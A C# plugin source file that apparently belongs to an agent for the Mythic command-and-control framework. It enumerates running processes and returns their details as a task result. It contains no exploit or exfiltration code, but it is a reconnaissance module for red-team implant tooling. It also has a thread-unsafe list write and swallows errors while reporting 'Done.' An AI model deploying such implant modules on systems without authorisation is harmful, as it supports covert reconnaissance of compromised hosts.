using PluginBase;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Threading.Tasks;

namespace Plugin
{
    public static class ps
    {
        public static ProcessResponseResult Execute(Dictionary<string, object> args)
        {
            try
            {
                List<MythicProcessInfo> processes = new List<MythicProcessInfo>();

                Process[] procs = Process.GetProcesses();
                Parallel.ForEach(procs, proc =>
                {
                    try
                    {
                        processes.Add(new MythicProcessInfo()
                        {
                            process_id = proc.Id,
                            name = proc.ProcessName,
                            description = proc.MainWindowTitle,
                            bin_path = proc.MainModule.FileName,
                            start_time = proc.StartTime.ToString(),
                        });
                    }
                    catch
                    {
                        processes.Add(new MythicProcessInfo()
                        {
                            process_id = proc.Id,
                            name = proc.ProcessName,
                            description = proc.MainWindowTitle,
                        });
                    }
                });

                return new ProcessResponseResult
                {
                    task_id = (string)args["task-id"],
                    completed = "true",
                    user_output = "Done.",
                    processes = processes
                };
            }
            catch (Exception e)
            {
                return new ProcessResponseResult
                {
                    task_id = (string)args["task-id"],
                    completed = "true",
                    user_output = "Done.",
                    processes = new List<MythicProcessInfo>()
                };
            }
        }
    }
}
